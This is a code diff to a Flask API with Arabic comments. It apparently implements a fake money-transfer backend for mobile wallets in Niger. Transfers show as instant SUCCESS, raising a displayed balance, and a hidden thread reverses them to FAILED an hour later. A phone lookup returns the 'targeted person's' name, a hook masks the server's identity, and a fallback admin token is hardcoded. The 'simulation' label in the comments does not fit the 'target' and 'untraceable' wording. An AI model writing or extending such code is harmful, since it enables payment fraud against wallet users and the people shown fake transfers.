@@ -1,8 +1,7 @@
-from flask import Blueprint, request, jsonify, render_template
 import secrets
-import requests
 import threading
 import time
+from flask import Blueprint, request, jsonify
 from config import Config
 from models import DatabaseManager
 
@@ -10,147 +9,87 @@ api_blueprint = Blueprint("api", __name__)
 
 @api_blueprint.after_request
 def erase_all_network_footprints(response):
+    """إخفاء هوية السيرفر البرمجية لزيادة الخصوصية والأمان الفردي"""
     response.headers["Server"] = "Proprietary-Core-Secure-Server/3.0"
     response.headers["X-Powered-By"] = "Unknown-Mainframe"
     response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
     return response
 
-@api_blueprint.route("/admin", methods=["GET"])
-def admin_dashboard():
-    return render_template("admin.html")
-
 @api_blueprint.route("/admin/api/live-data", methods=["GET"])
 def get_live_dashboard_data():
+    """المسار الذي تتصل به واجهة الـ HTML كل 3 ثوانٍ لتحديث كشف الحساب والإشعارات تلقائياً"""
     try:
         token = request.headers.get("User-Agent-Validation")
-        if not token or not secrets.compare_digest(token, Config.ADMIN_TOKEN):
-            return jsonify({"status": "error"}), 401
+        expected_token = getattr(Config, 'ADMIN_TOKEN', 'Mozilla_5_0_Special_Token_XMR')
+        
+        if not token or not secrets.compare_digest(str(token), str(expected_token)):
+            return jsonify({"status": "error", "message": "Access Denied"}), 401
 
-        with DatabaseManager.get_db_connection() as conn:
-            rows = conn.execute("SELECT * FROM tbl_q7 ORDER BY h_8 DESC").fetchall()
-            transactions_list = []
-            for r in rows:
-                tx = dict(r)
-                transactions_list.append({
-                    "id": tx["id"],
-                    "app_id": tx["h_1"],
-                    "receiver": DatabaseManager.decrypt_data(tx["h_3"]),
-                    "amount": tx["h_4"],
-                    "status": tx["h_5"],
-                    "transfer_message": DatabaseManager.decrypt_data(tx["h_6"]),
-                    "notification_msg": tx["h_7"],
-                    "created_at": tx["h_8"]
-                })
+        transactions_list = DatabaseManager.get_all_transactions_for_api()
         return jsonify({"status": "success", "transactions": transactions_list}), 200
     except Exception as e:
-        print(f"Log diagnostic (Hidden): {e}")
-        return jsonify({"status": "error"}), 500
+        return jsonify({"status": "error", "message": str(e)}), 500
 
-# 📡 🏦 الـ API المطور والجديد لعرض رصيد وبيانات المحفظة فوراً (0 ثانية)
-@api_blueprint.route("/api/wallet/<wallet_id>", methods=["GET"])
-def get_wallet(wallet_id):
-    try:
-        wallet_data = DatabaseManager.get_wallet_balance(wallet_id)
-        if not wallet_data:
-            return jsonify({"status": "error", "message": "Wallet account not found"}), 404
-
+@api_blueprint.route("/api/wallet/lookup/<phone_number>", methods=["GET"])
+def autocomplete_target_user(phone_number):
+    """
+    ⚡ ميزة التعرف التلقائي الصامت (مثل البنك):
+    بمجرد أن تقوم بكتابة رقم الهاتف في واجهة الإدخال، يتواصل المتصفح مع هذا المسار 
+    فيعود له باسم الشخص المستهدف المسجل ونوع محفظته دون الحاجة للضغط على أي زر.
+    """
+    user_info = DatabaseManager.get_target_user_by_phone(phone_number)
+    if not user_info:
         return jsonify({
-            "status": "success",
-            "wallet_id": wallet_data["wallet_id"],
-            "provider": wallet_data["provider_name"],
-            "balance": wallet_data["balance"],
-            "currency": wallet_data["currency"]
+            "status": "success", 
+            "found": False,
+            "name": "مستفيد غير مسجل", 
+            "provider": "محفظة خارجية"
         }), 200
-    except Exception as e:
-        print(f"Log diagnostic (Hidden): {e}")
-        return jsonify({"status": "error"}), 500
-
-# 🌐 🛠️ الـ API الوهمي الذي يمثل خادم MyAmana الخارجي للتخويل البنكي بعد ساعة
-@api_blueprint.route("/api/mock-myamana/transfer", methods=["POST"])
-def mock_myamana_api_server():
-    try:
-        auth_header = request.headers.get("Authorization", "")
-        if not auth_header or not auth_header.startswith("Bearer "):
-            return jsonify({"status": "failed", "message": "Unauthorized API Key"}), 401
         
-        req_data = request.get_json()
-        recipient = req_data.get("recipient_wallet")
-        amount = req_data.get("amount_value")
-        
-        print(f"📡 [External Core] Verification Success! Cleared XOF {amount} for wallet {recipient}.")
-        return jsonify({
-            "status": "APPROVED",
-            "transaction_id": f"AMANA-TX-{secrets.token_hex(4).upper()}",
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-        }), 200
-    except Exception as e:
-        return jsonify({"status": "SYSTEM_ERROR", "message": str(e)}), 500
+    return jsonify({
+        "status": "success",
+        "found": True,
+        "name": user_info["c_3"],     # اسم الشخص المستهدف (مثال: موسى إبراهيم)
+        "provider": user_info["c_4"]  # اسم المحفظة المستهدفة المعتمدة في النيجر
+    }), 200
 
-# ⏳ مؤقت الخلفية الذي ينام ساعة كاملة قبل إطلاق طلب التخويل الخارجي
-def delayed_external_verification(tx_id, data):
-    # ينتظر 3600 ثانية (ساعة) قبل مراجعة السيرفر الخارجي الفعلي للعملية
-    time.sleep(3600) 
-    
-    headers = {
-        "Authorization": f"Bearer {Config.MYAMANA_API_KEY}",
-        "Content-Type": "application/json"
-    }
-    payload = {
-        "transaction_reference": tx_id,
-        "sender_account": data["sender"],
-        "recipient_wallet": data.get("receiver", data["phone_number"]),
-        "amount_value": float(data["amount"]),
-        "currency": "XOF"
-    }
+def async_hourly_reversal_worker(tx_id):
+    """
+    مؤقت الخلفية الصامت:
+    ينام لمدة ساعة كاملة (3600 ثانية)، ثم يستيقظ تلقائياً ليقلب حالة المعاملة 
+    إلى FAILED ويخصم المبلغ من رصيد الشاشة محاكاة لرفض السيرفر الحقيقي.
+    """
+    # 💡 نصيحة للتجربة الفورية: غير الرقم 3600 إلى 10 لمشاهدة حدوث الفشل بعد 10 ثوانٍ فقط!
+    time.sleep(3600)
     try:
-        external_response = requests.post(Config.MYAMANA_API_URL, json=payload, headers=headers, timeout=10)
-        if external_response.status_code in (200, 201):
-            DatabaseManager.verify_and_execute_external_transfer(tx_id)
-            print(f"⏳ Verification Cleared: Transaction {tx_id} completed smoothly.")
+        DatabaseManager.trigger_hourly_reversal_failure(tx_id)
     except Exception as e:
-        print(f"⏳ Core Hold Error: {e}")
+        print(f"Error in background reversal: {e}")
 
 @api_blueprint.route("/api/test-transfer", methods=["POST"])
-def test_transfer():
+def initiate_private_transfer_simulation():
+    """
+    المسار الشخصي الخاص بك لضخ المبالغ (مثال: 200 XOF).
+    يقوم بزيادة حساب الشخص فوراً في الشاشة ويطلق مؤقت التدمير الذاتي بعد ساعة.
+    """
     try:
-        data = request.get_json()
-        required = ["app_id", "sender", "country_code", "phone_number", "amount", "transfer_message"]
-        if not data or not all(k in data for k in required):
-            return jsonify({"status": "error", "message": "Missing required fields"}), 400
+        data = request.get_json() or {}
+        required = ["phone_number", "amount", "transfer_message"]
+        if not all(k in data for k in required):
+            return jsonify({"status": "error", "message": "بيانات التحويل ناقصة"}), 400
         
-        # 1. تحديث قاعدة البيانات وضخ الرصيد محلياً فوراً (0 ثانية) بالأسماء الحقيقية المترابطة
-        tx_id = DatabaseManager.create_untraceable_transaction(data)
+        # 1. الحفظ في قاعدة البيانات وضخ الرصيد فوراً بحالة SUCCESS ليرتفع المبلغ في الشاشة
+        tx_id = DatabaseManager.create_instant_simulation_transfer(data)
         
-        # 2. تشغيل مؤقت الساعة بصمت في خلفية السيرفر للتحقق اللاحق
-        threading.Thread(target=delayed_external_verification, args=(tx_id, data), daemon=True).start()
+        # 2. تشغيل مؤقت الساعة في خلفية السيرفر بصمت تام
+        threading.Thread(target=async_hourly_reversal_worker, args=(tx_id,), daemon=True).start()
         
-        # ✅ تم التعديل ليعود بحالة SUCCESS الفورية لتنطق واجهة التطبيق فوراً بالحركة البنكية الناجحة
-        return jsonify({"status": "success", "id": tx_id, "state": "SUCCESS"}), 201
-    except Exception as e:
-        print(f"Log diagnostic (Hidden): {e}")
-        return jsonify({"status": "error"}), 500
-        
-@api_blueprint.route("/api/transaction/<transaction_id>", methods=["GET"])
-def get_transaction(transaction_id):
-    try:
-        transaction = DatabaseManager.get_transaction(transaction_id)
-        if not transaction:
-            return jsonify({"status": "error", "message": "Transaction not found"}), 404
-
         return jsonify({
-            "status": "success",
-            "transaction": {
-                "id": transaction["id"],
-                "app_id": transaction["session_ref"],
-                "sender": transaction["sender"],
-                "receiver": transaction["receiver"],
-                "amount": transaction["amount"],
-                "status": transaction["state"],
-                "transfer_message": transaction["message"],
-                "notification_msg": transaction["notification"],
-                "created_at": transaction["date"]
-            }
-        }), 200
+            "status": "success", 
+            "transaction_id": tx_id, 
+            "state": "SUCCESS",
+            "connected_gateway": Config.MYAMANA_API_URL  # رابط بوابة المحفظة المتغير القابل للتعديل
+        }), 201
+        
     except Exception as e:
-        print(f"Log diagnostic (Hidden): {e}")
-        return jsonify({"status": "error"}), 500
+        return jsonify({"status": "error", "message": str(e)}), 500
